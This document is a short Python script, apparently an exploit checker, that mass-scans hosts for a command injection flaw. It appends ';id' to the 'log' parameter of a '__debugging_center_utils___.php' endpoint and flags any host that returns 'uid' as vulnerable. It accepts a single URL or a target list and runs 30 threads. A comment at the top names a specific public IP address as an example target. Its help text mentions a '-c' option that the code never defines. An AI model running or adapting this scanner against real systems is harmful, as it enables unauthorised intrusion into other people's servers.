# http://58.177.152.54:5100/__debugging_center_utils___.php?log=;id
from lxml import etree
import requests
from multiprocessing.dummy import Pool
import argparse
import textwrap

def check(url):
    try:
        url = f"{url}/__debugging_center_utils___.php?log=;id"
        handers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0'
        }
        response = requests.get(url=url,headers=handers,verify=False,timeout=3)
        if response.status_code == 200 and 'uid' in response.text:
            print(f'{url}存在漏洞')
        else:
            print(f'{url}不存在漏洞')
    except Exception as e:
        print("延时")


def main():
    parser = argparse.ArgumentParser(description='攻击方式' , epilog=textwrap.dedent('''example:
    python bb.py -u http://192.168.1.108 -c id'''))
    parser.add_argument('-u','--url',help='',dest='url')
    parser.add_argument('-r','--rl',help='',dest='rl')
    args = parser.parse_args()
    num1 = args.url
    num2 = args.rl
    pool = Pool(processes=30)
    lists = []
    try:
        if num1:
            check(num1)
        elif num2:
            with open(num2,'rt') as f:
                for i in f.readlines():
                    target = i.strip()
                    if 'http' in target:
                        lists.append(target)
                    else:
                        targets = f"http://{target}"
                        lists.append(targets)
    except Exception as e:
        pass
    pool.map(check,lists)


if __name__ == '__main__':
    main()
